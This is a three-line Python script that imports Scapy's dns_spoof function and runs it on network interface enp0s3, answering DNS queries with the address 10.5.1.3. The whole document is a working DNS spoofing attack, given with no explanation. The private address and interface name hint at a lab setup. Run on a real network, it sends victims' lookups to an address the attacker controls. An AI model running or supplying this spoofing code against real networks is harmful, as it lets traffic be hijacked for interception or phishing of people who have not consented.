from scapy.all import dns_spoof


dns_spoof(iface="enp0s3", joker="10.5.1.3")
  